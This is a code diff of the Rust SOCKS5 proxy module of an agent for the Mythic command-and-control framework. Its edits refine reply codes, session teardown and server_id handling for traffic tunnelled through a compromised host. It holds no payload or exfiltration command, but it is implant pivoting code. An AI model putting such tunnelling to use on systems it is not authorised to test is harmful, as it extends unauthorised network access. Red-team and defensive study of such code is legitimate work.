@@ -3,7 +3,6 @@ use crate::agent::AgentTask;
 use crate::mythic_continued;
 
 use base64::{decode, encode};
-use serde::{Deserialize, Serialize};
 use serde_json::{json, Value};
 
 use std::collections::HashMap;
@@ -35,23 +34,15 @@ fn hex_preview(data: &[u8], max: usize) -> String {
         let _ = write!(&mut s, "{:02x}", b);
     }
     if data.len() > max {
-        s.push_str("…");
+        s.push('…');
     }
     s
-}
-
-fn str_preview(s: &str, max: usize) -> String {
-    let mut out = s.to_string();
-    if out.len() > max {
-        out.truncate(max);
-        out.push('…');
-    }
-    out
 }
 
 /* ------------------------------- SOCKS utils ------------------------------ */
 
 fn build_reply(rep: u8, bound: Option<SocketAddr>) -> Vec<u8> {
+    // REP codes: 0x00 ok, 0x01 general fail, 0x05 conn refused, 0x03 net unreachable, etc.
     let mut out = vec![0x05, rep, 0x00]; // VER=5, REP, RSV=0
     match bound {
         Some(SocketAddr::V4(v4)) => {
@@ -80,12 +71,21 @@ fn send_socks_packet(
     data: &[u8],
     exit: bool,
 ) -> Result<(), Box<dyn Error>> {
+    // Try to keep server_id as number (preferred by Mythic), fall back to string
+    let sid_json = match server_id.parse::<u64>() {
+        Ok(n) => json!(n),
+        Err(_) => json!(server_id),
+    };
     tx.send(json!({
-        "server_id": server_id,
+        "server_id": sid_json,
         "data": encode(data),
         "exit": exit
     }))?;
     Ok(())
+}
+
+fn send_exit_only(tx: &std_mpsc::Sender<Value>, server_id: &str) {
+    let _ = send_socks_packet(tx, server_id, &[], true);
 }
 
 fn parse_connect(decoded: &[u8]) -> Result<(String, u16), Box<dyn Error>> {
@@ -161,7 +161,6 @@ fn as_string_or_number(v: &Value) -> Option<String> {
 // Accepts a single SOCKS item of shape: {server_id, data, exit?}
 fn normalize_socks_item(v: &Value) -> Option<Value> {
     let sid = v.get("server_id").and_then(as_string_or_number)?;
-    // Mythic uses data (b64); some internal paths may use chunk_data
     let data = v
         .get("data")
         .or_else(|| v.get("chunk_data"))
@@ -229,10 +228,7 @@ async fn run_session(
         &tx_out,
         &parent_task_id,
         "connect.req",
-        format!(
-            "server_id={server_id}; hex={}",
-            hex_preview(&decoded, 64)
-        ),
+        format!("server_id={server_id}; hex={}", hex_preview(&decoded, 64)),
     );
 
     let (addr, port) = match parse_connect(&decoded) {
@@ -267,7 +263,15 @@ async fn run_session(
                     "connect.err",
                     format!("server_id={server_id}; err={e}"),
                 );
-                let _ = send_socks_packet(&tx_out, &server_id, &build_reply(0x01, None), true);
+                // 0x05 "Connection refused" if contains "refused", else 0x01 "General failure"
+                let rep = if e.to_string().to_lowercase().contains("refused") {
+                    0x05
+                } else if e.to_string().to_lowercase().contains("unreachable") {
+                    0x03 // network/host unreachable
+                } else {
+                    0x01
+                };
+                let _ = send_socks_packet(&tx_out, &server_id, &build_reply(rep, None), true);
                 return Ok(());
             }
             Err(_) => {
@@ -310,7 +314,7 @@ async fn run_session(
             match timeout(Duration::from_secs(300), r_r.read(&mut buf)).await {
                 Ok(Ok(0)) => {
                     debug_to_mythic(&tx_up, &parent_up, "a2m.eof", format!("server_id={sid_up}"));
-                    let _ = send_socks_packet(&tx_up, &sid_up, b"", true);
+                    send_exit_only(&tx_up, &sid_up);
                     break;
                 }
                 Ok(Ok(n)) => {
@@ -325,7 +329,7 @@ async fn run_session(
                         "a2m.read_err",
                         format!("server_id={sid_up}; err={e}"),
                     );
-                    let _ = send_socks_packet(&tx_up, &sid_up, b"", true);
+                    send_exit_only(&tx_up, &sid_up);
                     break;
                 }
                 Err(_) => {
@@ -335,7 +339,7 @@ async fn run_session(
                         "a2m.idle_timeout",
                         format!("server_id={sid_up}"),
                     );
-                    let _ = send_socks_packet(&tx_up, &sid_up, b"", true);
+                    send_exit_only(&tx_up, &sid_up);
                     break;
                 }
             }
@@ -351,7 +355,7 @@ async fn run_session(
             let exit = pkt.get("exit").and_then(|v| v.as_bool()).unwrap_or(false);
             if exit {
                 debug_to_mythic(&tx_dn, &parent_dn, "m2a.exit", format!("server_id={sid_dn}"));
-                let _ = AsyncWriteExt::shutdown(&mut r_w).await;
+                let _ = r_w.shutdown().await;
                 break;
             }
             let data_b64 = pkt.get("data").and_then(|v| v.as_str()).unwrap_or("");
@@ -372,7 +376,7 @@ async fn run_session(
                 }
             }
         }
-        let _ = AsyncWriteExt::shutdown(&mut r_w).await;
+        let _ = r_w.shutdown().await;
     });
 
     let _ = a2m.await;
@@ -397,12 +401,7 @@ pub fn handle_socks(
     let task_val = rx.recv()?;
     let task: AgentTask = serde_json::from_value(task_val)?;
 
-    debug_to_mythic(
-        tx,
-        &task.id,
-        "socks.handler",
-        "Dispatcher starting",
-    );
+    debug_to_mythic(tx, &task.id, "socks.handler", "Dispatcher starting");
 
     // Bridge std::mpsc -> tokio::mpsc (fan-out socks arrays or single packets)
     let (bridge_tx, mut bridge_rx) = tokio_mpsc::unbounded_channel::<Value>();
@@ -424,7 +423,9 @@ pub fn handle_socks(
                 }
 
                 // 2) Single packet at top-level
-                if v.get("server_id").is_some() && (v.get("data").is_some() || v.get("chunk_data").is_some()) {
+                if v.get("server_id").is_some()
+                    && (v.get("data").is_some() || v.get("chunk_data").is_some())
+                {
                     if let Some(n) = normalize_socks_item(&v) {
                         let _ = bridge_tx.send(n);
                     }
@@ -459,8 +460,6 @@ pub fn handle_socks(
                         continue;
                     }
                 }
-
-                // Not SOCKS—ignore (dispatcher will log occasional samples if you want)
             }
 
             debug_to_mythic(&tx_dbg, &parent_id, "bridge.end", "blocking receiver closed");
@@ -474,12 +473,7 @@ pub fn handle_socks(
         let parent_task_id = task.id.clone();
         let mut seen: u64 = 0u64;
 
-        debug_to_mythic(
-            tx,
-            &parent_task_id,
-            "dispatcher.run",
-            "awaiting SOCKS items",
-        );
+        debug_to_mythic(tx, &parent_task_id, "dispatcher.run", "awaiting SOCKS items");
 
         while let Some(item) = bridge_rx.recv().await {
             seen += 1;
@@ -505,12 +499,7 @@ pub fn handle_socks(
                 let parent_id = parent_task_id.clone();
                 let sid_clone = sid.clone();
 
-                debug_to_mythic(
-                    &tx_out,
-                    &parent_id,
-                    "session.spawn",
-                    format!("server_id={sid_clone}"),
-                );
+                debug_to_mythic(&tx_out, &parent_id, "session.spawn", format!("server_id={sid_clone}"));
 
                 tokio::spawn(async move {
                     if let Err(e) = run_session(parent_id, sid_clone, sess_rx, tx_out).await {
@@ -520,10 +509,18 @@ pub fn handle_socks(
                 sess_tx
             });
 
-            // forward packet to the session
-            let _ = entry.send(item.clone());
+            // forward packet to the session; if the receiver is gone, drop the mapping
+            if entry.send(item.clone()).is_err() {
+                sessions.remove(&sid);
+                debug_to_mythic(
+                    tx,
+                    &parent_task_id,
+                    "dispatcher.drop_dead",
+                    format!("server_id={sid}"),
+                );
+            }
 
-            // if exit flagged at dispatcher level, drop session mapping
+            // if exit flagged at dispatcher level, drop session mapping proactively
             if exit {
                 sessions.remove(&sid);
                 debug_to_mythic(
